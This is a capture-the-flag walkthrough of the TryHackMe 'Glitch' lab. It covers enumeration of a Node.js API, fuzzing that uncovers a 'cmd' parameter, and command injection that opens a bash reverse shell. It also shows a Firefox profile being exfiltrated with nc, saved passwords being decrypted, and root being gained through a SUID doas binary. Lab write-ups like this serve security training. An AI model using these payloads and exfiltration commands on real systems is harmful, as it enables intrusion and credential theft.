# Room: Glitch

## General Info
- **Room link:** [Glitch](https://tryhackme.com/room/glitch)

## Description

This is a simple challenge in which you need to exploit a vulnerable web application and root the machine. It is beginner oriented, some basic JavaScript knowledge would be helpful, but not mandatory. Feedback is always appreciated.

## Provided Files / Links
- [x] Target Machine IP (10.10.51.179)


## Enumeration / Recon
- Ports Enumeration

Basic port enumeration:
`nmap -sV 10.10.51.179 -p- -T5`

```
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Directories enumeration

```
gobuster dir -u http://10.10.51.179 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

When visiting the website, I notice the following script in the HTML:

```

      function getAccess() {
        fetch('/api/access')
          .then((response) => response.json())
          .then((response) => {
            console.log(response);
          });
      }
    
```

I use Burp Suite to perform this request:

```
GET /api/access HTTP/1.1
Host: 10.10.51.179
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: token=value
If-None-Match: W/"2d4-9vv1ycPBiNQXrvbVqqN9dD9MWUM"
Connection: keep-alive
```

And I get the following response:

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Fri, 23 May 2025 08:15:51 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 36
Connection: keep-alive
X-Powered-By: Express
ETag: W/"24-8nMb1yUaJcnW8A0Wwa1z8teVcXo"

{"token":"dGhpc19pc19ub3RfcmVhbA=="}
```

The token is base64 encoded and the decoded version is `this_is_not_real`.

I then added the token value in the web application cookies. Now the page loads with elements added from the /api/items endpoint:

```
(async function () {
  const container = document.getElementById('items');
  await fetch('/api/items')
    .then((response) => response.json())
    .then((response) => {
      response.sins.forEach((element) => {
        let el = `<div class="item sins"><div class="img-wrapper"></div><h3>${element}</h3></div>`;
        container.insertAdjacentHTML('beforeend', el);
      });
      response.errors.forEach((element) => {
        let el = `<div class="item errors"><div class="img-wrapper"></div><h3>${element}</h3></div>`;
        container.insertAdjacentHTML('beforeend', el);
      });
      response.deaths.forEach((element) => {
        let el = `<div class="item deaths"><div class="img-wrapper"></div><h3>${element}</h3></div>`;
        container.insertAdjacentHTML('beforeend', el);
      });
    });

  const buttons = document.querySelectorAll('.btn');
  const items = document.querySelectorAll('.item');
  buttons.forEach((button) => {
    button.addEventListener('click', (event) => {
      event.preventDefault();
      const filter = event.target.innerText;
      items.forEach((item) => {
        if (filter === 'all') {
          item.style.display = 'flex';
        } else {
          if (item.classList.contains(filter)) {
            item.style.display = 'flex';
          } else {
            item.style.display = 'none';
          }
        }
      });
    });
  });
})();
```

I check which HTTP methods are allowed on this endpoint:

```
curl -i -X OPTIONS http://10.10.162.38/api/items

HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Fri, 23 May 2025 08:48:25 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 13
Connection: keep-alive
X-Powered-By: Express
Allow: GET,HEAD,POST
ETag: W/"d-bMedpZYGrVt1nR4x+qdNZ2GqyRo"

GET,HEAD,POST% 
```

When making a POST request (without a payload), I get this response:

```
{"message":"there_is_a_glitch_in_the_matrix"}
```

Since I don't get much information about the api structure, I will try to fuzz parameters (I use the wordlist 1-4_all_letters_a-z.txt to test for all possible characters in a 4 letters parameter):

```
wfuzz -X POST -w /usr/share/wordlists/SecLists/Fuzzing/1-4_all_letters_a-z.txt --hc 404,400 http://10.10.162.38/api/items\?FUZZ\=1
```

And I get the following result:

```
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                   
=====================================================================

000002370:   200        0 L      2 W        25 Ch       "cmd" 
```

Now I can exploit the cmd parameter to get a reverse shell (I use Burp Suite to create the connection):

```
POST /api/items?cmd=require("child_process").exec('bash+-c+"bash+-i+>%26+/dev/tcp/10.9.1.194/1337+0>%261"') HTTP/1.1
Host: 10.10.162.38
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

I am in the target machine now and I stabilize the shell with `python3 -c 'import pty; pty.spawn("/bin/bash")'`.

I then find the flag in /home/user/user.txt: **THM{i_don't_know_why}**.

In the /home/user directory, I find a .firefox directory.

I then proceed to zip the folder (firefox.tar.gz) and send it to my machine:

```
nc 10.9.1.194 33456 < firefox.tar.gz (on target machine)
nc -nvlp 33456 > firefox.tar.gz (on my machine)
```
I find this github https://github.com/unode/firefox_decrypt to decrypt passwords.

```
python3 firefox_decrypt/firefox_decrypt.py .firefox
Select the Mozilla profile you wish to decrypt
1 -> hknqkrn7.default
2 -> b5w4643p.default-release
```

When selecting the second option, I get v0id's password:

```
Website:   https://glitch.thm
Username: 'v0id'
Password: 'love_the_void'
```

I can now switch user and become v0id.

I then run the following command to find files with potentially insecure or incorrect SUID bits:

```
find / -perm -4000 -type f -exec ls -l {} \; 2>/dev/null
```

And I find this file:

```
-rwsr-xr-x 1 root root 37952 Jan 15  2021 /usr/local/bin/doas
```

I then use the following doas exploit:

```
/usr/local/bin/doas -u root /bin/bash
```

And I am root. I find the root flag in /root/root.txt: **THM{diamonds_break_our_aching_minds}**